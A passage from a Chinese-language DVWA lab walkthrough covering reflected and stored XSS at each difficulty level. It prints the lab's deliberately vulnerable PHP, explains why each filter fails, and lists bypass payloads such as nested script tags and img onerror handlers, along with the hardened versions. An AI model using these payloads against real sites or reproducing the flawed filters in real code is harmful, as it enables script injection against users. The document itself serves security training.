<span class="hljs-string">'&lt;/pre&gt;'</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里只是判断是否存在name变量，如果存在直接插入</p><pre>标签中，不存在任何过滤</pre><p></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;script&gt;<span class="hljs-built_in">alert</span>('hacker')&lt;/script&gt;<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210440503.png" alt="image-20240112210440503"></p>
<h2 id="Medium-11">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"X-XSS-Protection: 0"</span>);<br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"name"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] != <span class="hljs-literal">NULL</span> ) {<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello <span class="hljs-subst">{$name}</span>&lt;/pre&gt;"</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>将<script>过滤为空，这意味着可以大写或者双写绕过</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;s&lt;script&gt;cript&gt;<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)&lt;/script&gt;<br>&lt;Script&gt;cript&gt;<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210655274.png" alt="image-20240112210655274"></p>
<h2 id="High-11">High</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>过滤很全，将<script>标签中的每个字符都过滤了，但我们可以使用其他标签</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-number">1</span> onerror=<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)<br>&lt;<span class="hljs-selector-tag">a</span> href = &#x27;javascript:<span class="hljs-built_in">alert</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>)<span class="hljs-string">&#x27;&gt;click&lt;/a&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112210946716.png" alt="image-20240112210946716"></p>
<h2 id="Impossible-11">Impossible</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>防止CSRF，接着采用<code>htmlspecialchars</code>杜绝了特殊字符：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211143475.png" alt="image-20240112211143475"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211129022.png" alt="image-20240112211129022"></p>
<p>这意味着我们的任何事件标签都将无用</p>
<h1>0x12 XSS(Stored)</h1>
<h2 id="Low-12">Low</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<span class="hljs-comment">//对字符串收尾去空</span><br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<span class="hljs-comment">//取出反引号</span><br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>可以看见对用户的输入在经过几个函数的处理后，插入了数据库，但并未做出对xss的过滤，但防止SQL注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112211743611.png" alt="image-20240112211743611"></p>
<p>可以看到当我们插入上述数据的时候，每当我们访问此页面，便会执行xss</p>
<h2 id="Medium-12">Medium</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>可以看到这回对message做出了成功的过滤，但却忘记正确过滤name，只是将<script>标签替换为空</p>
<p>但这里由于对Name这一文本框有字数限制，但我们可以放到bp上，或者直接F12在html中直接修改</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212232937.png" alt="image-20240112212232937"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212246035.png" alt="image-20240112212246035"></p>
<p>可以看到成功XSS，类似paylaod还有：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;sc&lt;script&gt;ript&gt;<span class="hljs-built_in">alert</span>(XSS)&lt;/script&gt;<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=x onerror=<span class="hljs-built_in">alert</span>(&#x27;XSS&#x27;)&gt;<br></code></pre></td></tr></table></figure>
<p>当然还可以：审查元素手动将 <code>maxlength</code> 的值调大一点就可以了。</p>
<h2 id="High-12">High</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里同样对message做出了严格的过滤，但对name只是单纯过滤了<script>标签，这并没有什么用</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212626709.png" alt="image-20240112212626709"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212549693.png" alt="image-20240112212549693"></p>
<h2 id="Impossible-12">Impossible</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>防止CSRF，SQL注入，同时对message与name的内容都做出了相同且严格的过滤，这是无法绕过的</p>
<h1>0x13 CSP Bypass</h1>
<p>内容安全策略（CSP）使服务器管理员可以通过指定浏览器应认为是可执行脚本的有效源的域来减少或消除XSS可能发生的向量。然后，兼容CSP的浏览器将仅执行从这些允许列出的域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理HTML属性）。</p>
